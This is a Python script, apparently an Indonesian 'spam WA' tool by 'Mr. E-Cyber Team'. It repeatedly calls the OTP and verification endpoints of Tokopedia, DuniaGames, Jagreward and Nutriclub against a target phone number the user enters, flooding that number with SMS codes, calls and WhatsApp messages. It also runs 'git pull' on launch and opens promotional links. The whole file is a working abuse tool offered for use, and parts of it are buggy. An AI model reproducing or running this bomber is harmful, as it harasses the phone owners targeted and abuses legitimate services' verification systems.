



































































































































































































































































































































































































































# Jangan Lupa Subscribe Mr. E-Cyber Team
# -------{ Di sini Gw Import Module dulu }-------- #
import os,sys,time,requests,json,random,re
from requests import post
from requests import get
# -------{ Di sini gw memanggil git pull untuk otamatis ke update jika ada pembaruan }-------- #
os.system("git pull")
r = requests.Session()
dark_point = 1
# -------{ ini adalah inti dari script nya }-------- #
def mr_dark_nutric():
  darkreq = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'})
  if json.loads(darkreq.text)["StatusMessage"] == 'Request misscall berhasil':
       sukses("1","call","nutriclub")
       time.sleep(30)
  else:
       gagal("1","call","nutriclub")
       time.sleep(30)
def mr_dark_jag():
  dark_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+drknom)
  dark_json = json.loads(dark_request.text)
  if dark_json["message"] == 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.':
       sukses("2","call","jagreward")
       time.sleep(30)
  else:
       print (f'   \033[1;37m[\033[31m\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan sudah limit! \033[31m ')
       time.sleep(30)
def mr_x():
    time.sleep(1)
    os.system("clear")
    print ("\033[1;37m[\033[1;30m1\033[1;37m] \033[36m Subscribe YouTube\033[1;37m Mr. E-CYBER TEAM \033[36m CYBER CRIME HUNTER")
    time.sleep(1)
    os.system("xdg-open https://youtube.com/channel/UCprM5VxY0pQ_i3tZO5Leaqw")
    time.sleep(3)
    print ("\033[1;37m[\033[1;30m2\033[1;37m] \033[36m Join \033[1;37mCYBER CRIME HUNTER \033[36m by Mr. E-Cyber Team ")
    time.sleep(1)
    os.system("xdg-open https://chat.whatsapp.com/I7WPvLDtjuR9V0FkbXOfL8")
    time.sleep(3)
    os.system("clear")
# -------{ bang give alok bang :V }-------- #
def mr_dark_input():
    subs_mr_dark = input("   \033[1;37m\033[31m➤ \033[36m")
    if subs_mr_dark == "1":
         dark_point = 1
         print ("\033[1;30m<═════════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
         telkom_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         inquiryId_telkom = "219424679"
         telkom = ("0"+telkom_0)
         dark={
         "phoneNumber":telkom,
         "inquiryId":inquiryId_telkom
         }
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
         for i in range(int(jumlah)):
             darko=requests.post('https://api.duniagames.co.id/api/transaction/v1/top-up/transaction/req-otp/',headers=mr_telkom,json=dark).text
             if 'Field ini harus diisi dengan nomor Telkomsel' in darko:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mNo Target Harus Menggunakan Telkomsel! \033[31m ')
                  time.sleep(2)
                  print ("\033[1;30m<═════════════[\033[1;33;41m • \033[1;37mSTOP \033[1;33m• \033[0m\033[1;30m]═══════════════>")
                  break
             if 'Maaf, Anda belum melakukan konfirmasi OTP di transaksi sebelumnya, silakan coba kembali setelah 1 menit' in darko:
                  print ('   \033[1;37m[\033[31m#\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan inquiryId sedang di gunakan!, Mohon Coba Lagi! \033[31m ')
             else:
                  print (f'   \033[1;37m[\033[1;32m{dark_point}\033[1;37m] \033[1;32mTerkirim \033[31m ')
                  dark_point += 1
             dark_time(00, 60)
    elif subs_mr_dark == "3":
         dark_point = 1
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
         xl_0 = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         no = ("0"+xl_0)
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         InquiryId_xl = "237992422"
         id_xl = "237775262"
         dark_user = {
         'User-Agent' : 'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
         'Accept-Encoding' : 'gzip, deflate',
         'Connection' : 'keep-alive',
         'Origin' : 'https://accounts.tokopedia.com',
         'Accept' : 'application/json, text/javascript, */*; q=0.01',
         'X-Requested-With' : 'XMLHttpRequest',
         'Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8'
         }
         regist = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn='+no+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = dark_user).text
         drk = re.search(r'\<input\ id=\"Token\"\ value=\"(.*?)\"\ type\=\"hidden\"\>', regist).group(1)
         mr_dark_to_the_moon = {
         "otp_type" : "116",
         "msisdn" : no,
         "tk" : drk,
         "email" : '',
         "original_param" : "",
         "user_id" : "",
         "signature" : "",
         "number_otp_digit" : "6"
         }
         mr_dark_bruh = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = dark_user, data = mr_dark_to_the_moon).text
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
         for i in range(int(jumlah)):
             if 'Anda sudah melakukan 3 kali pengiriman kode' in mr_dark_bruh:
                  print(f'   \033[1;37m[\033[31m{dark_point}\033[1;37m] \033[1;37mSilahkan Coba Ulang Setelah 5 menit! \033[31m ')
                  time.sleep(5)
                  dark_point += 1
             else:
                  print(f'   \033[1;37m[\033[1;32m{dark_point}\033[1;37m] \033[1;32mTerkirim \033[31m ')
                  time.sleep(5)
                  dark_point += 1
    elif subs_mr_dark == "2":
         dark_point = 1
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mRUNNING \033[1;33m• \033[0m\033[1;30m]══════════════>")
         drknom = input("   \033[1;37m[\033[1;35m#\033[1;37m] No Target: \033[36m0")
         no = ("0"+drknom)
         jumlah = int(input("   \033[1;37m[\033[1;35m#\033[1;37m] Jumlah: \033[36m"))
         hd = {
         "accept": "text/html, application/xhtml+xml, application/json, */*",
         "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
         "content-length": "166",
         "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
         "origin": "https://h5.rupiahcepatweb.com",
         "referer": "https://h5.rupiahcepatweb.com/dua2/pages/openPacket/openPacket.html?activityId=11&invite=200219190100215723",
         "sec-fetch-dest": "empty",
         "sec-fetch-mode": "cors",
         "sec-fetch-site": "same-site",
         "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36"
         }
         dt = {"mobile":no,"noise":"1583590641573155574","request_time":"158359064157312","access_token":"11111"}
         data = json.dumps(dt)
         print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37mSTATUS \033[1;33m• \033[0m\033[1;30m]══════════════>")
         for i in range(int(jumlah)):
             dark_request = requests.get("https://id.jagreward.com/member/verify-mobile/"+drknom)
             dark_json = json.loads(dark_request.text)
             if 'Anda akan menerima sebuah panggilan dari sistem kami. Silakan isi 6 ANGKA TERAKHIR dari nomor telepon dibawah ini.' in dark_request:
                  print (f"   \033[1;37m[\033[1;32m{dark_point}\033[1;37m] \033[1;32mTerkirim \033[31m")
                  time.sleep(15)
                  dark_point += 1
             else:
                  print (f'   \033[1;37m[\033[31m{dark_point}\033[1;37m] \033[1;37mTidak dapat terkirim di karenakan sudah limit! \033[31m ')
                  time.sleep(15)
                  dark_point += 1
    elif subs_mr_dark == "4":
         os.system("xdg-open https://chat.whatsapp.com/I7WPvLDtjuR9V0FkbXOfL8")
         print ("")
    else:
         time.sleep(2)
         print ("\033[1;37m[\033[31m•\033[1;37m] Command: "+subs_mr_dark+" not found")
         time.sleep(3)
         os.system("clear")
         os.system("clear")
         banner_anjay_subs_mr_dark()
def banner_anjay_subs_mr_dark():


    print ("""
                \033[36m--oo//MMMMMMMMMMMMMMMMMooo--
             --oo//MMMMMMMMMMMMMMMMMMMMMMMooo--
           -oo//MMMMMMMMMMMMMMMMMMMMMMMMMMMM\oo\--
-------------------------------------------------------------

            E X E C U T O R   T E A M   C Y B E R
                 Author : Mr. E-CYBER TEAM
               S P A M     W A     V E R S I 2
_____________________________________________________________
      `M:-ho`NMNNNNNNNNmho-sN:Ms-shmMNNNNNNNNNM`sh-/M`
       `Mh`+ sdMNNNNMh`     NMosMN     `dMMMMMdo`/`hN
        d/h/.m.MNMMMM+      yM--My      oMMMMM.m`/h/h
        /d`/ss mNNNNN-      `d.-h`      -NNNNd ss/`d:
         hm/`+ d:mNNN                    NMd:h`+`/mh
         `doss/++.mNh                    hNm`o ss/d:
          sMy+.:./+                        +/.:/+yMs
           -dyo/////.```              ```./////oyd-
             :hMhoosss/`              `/sssoohMh:
               .ohysoos.              ./soosyh+`
                  `/sdN`              `Nds/`

           ***  POWERED  BY  MR.  E-CYBER  TEAM  ***
          ****        EXECUTOR TEAM CYBER        ****
-------------------------------------------------------------\033[36m""")
    print ("")
    print ("    \033[1;37m\033[31m>\033[1;37m YouTube Channel\033[31m:\033[1;37m\033[1;37m Mr. E-CYBER TEAM ")
    print ("    \033[1;37m\033[31m>\033[1;37m Github\033[31m:\033[1;37m\033[1;37m github.com/teamcyber-glitch ")
    print ("")
    print ("   \033[1;37m\033[31m>\033[1;37m Status Otp\033[31m:\033[1;37m\033[1;32m Running")
    print ("   \033[1;37m\033[31m>\033[1;37m Version\033[31m:\033[1;37m\033[1;37m 1\033[31m.\033[1;37m8")
    print ("")
    print ("    \033[1;37m\033[31m\033[1;33m1\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mKirim Spam SMS \033[31m(\033[36mSubscribe Bro\033[31m) ")
    print ("    \033[1;37m\033[31m\033[1;33m2\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mKirim Spam Panggilan \033[31m(\033[36mMr. E-Cyber\033[31m) ")
    print ("    \033[1;37m\033[31m\033[1;33m3\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mKirim Spam Whatsapp \033[31m(\033[36mTokopedia\033[31m) ")
    print ("    \033[1;37m\033[31m\033[1;33m4\033[31m.\033[1;37m \033[31m\033[1;37m\033[1;37mJoin CYBER CRIME HUNTER by Mr. E-Cyber Team \033[31m(\033[32mWhatsapp\033[31m) ")
    print ("")
    mr_dark_input()
def dark_time(start_minute, start_second):
    total_second = start_minute * 15 + start_second
    while total_second:
        mins, secs = divmod(total_second, 15)
        print(f'   \033[1;37m[\033[1;35m#\033[1;37m] waiting (\033[1;32m{secs:02d}\033[1;37m)', end='\r')
        time.sleep(1)
        total_second -= 1

mr_telkom={
'Host':'api.duniagames.co.id',
'content-length':'50',
'accept':'application/json, text/plain, */*',
'sec-ch-ua-mobile':'?0',
'save-data':'on',
'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-T825Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36',
'content-type':'application/json',
'origin':'https://duniagames.co.id',
'sec-fetch-site':'same-site',
'sec-fetch-mode':'cors',
'sec-fetch-dest':'empty',
'referer':'https://duniagames.co.id/',
'accept-encoding':'gzip, deflate, br',
'accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'
}
mr_x()
banner_anjay_subs_mr_dark()










































































































































